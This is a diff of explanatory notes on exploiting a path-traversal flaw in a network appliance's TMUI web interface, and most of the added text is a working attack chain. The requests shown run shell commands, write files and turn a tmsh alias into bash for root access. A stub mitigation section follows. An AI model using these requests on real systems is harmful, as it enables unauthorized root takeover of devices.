@@ -54,34 +54,53 @@ The exploit is a "..;", the following is an exploitable URL that will return a l
 /tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=list+auth+user+admin
 ```
 
-VLANs and Self IP Configuration "self ip"
-  Static self-ip - health monitoring ,single machine
-  Floating - 
-     S
-TMUI/Configuration Utility
-  "exposed under default configurations"
-  Vulnerable URL:
-  ```
-  https://[hostname]/tmui/login.jsp
-  ```
-  How to exploit?
-  code injection
-  * execute commands: tmsh.jsp
-  * read files:
-  * write files:
-  How to get root access from this?
-  create alias, delete alias, link list to bash
-    Now can use full terminal/bash
-    What is alias?
-    Create alias command
-    
-  1. create alias
-  2. create file
-  3. execute file
-  Code to check if you are vulnerable
+> **The Three Most Common Exploits**
+> 
+> Execute Command (only allows for tmsh commands):
+> ```
+> /tmui/locallb/workspace/tmshCmd.jsp
+> ```
+> 
+> Read Files:
+> ```
+> /tmui/locallb/workspace/fileRead.jsp
+> ```
+> 
+> Write Files:
+> ```
+> /tmui/locallb/workspace/fileSave.jsp
+> ```
 
+While the above execute command can only access tmsh commands, you can use "create alias" to allow the hacker to execute any bash command as the root user! "Create alias" can be used to link "list" command in tmsh to "bash". This gives full root access to the linux interface:
+
+```
+https://[hostname]/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=create+cli+alias+private+list+command+bash
+```
+
+AFter you send in the above command, any following command that you send in using "list" will actually be sending and executing a "bash" command!
+
+Instead of continually executing one line bash commands, you can create a bash script and save it suing the command we learned above. This is what it will look like to save a bash script:
+```
+fileSave.jsp?fileName=/tmp/cmd&content=id
+```
+Then to execute the script (remember "list" now means "bash":
+```
+tmshCmd.jsp?command=list+/tmp/cmd
+```
+
+In order to delete the alias and clean up:
+```
+https://[hostname]/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=create+cli+alias+private+list
+```
+
+[The typical sequence]
 
 ## Mitigation
+
+Test to see if you are vulnerable
+```
+https://[hostname]/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/f5-release
+```
 
 Check if you are vulnerable: code 
 Check logs to see if you have been exploited
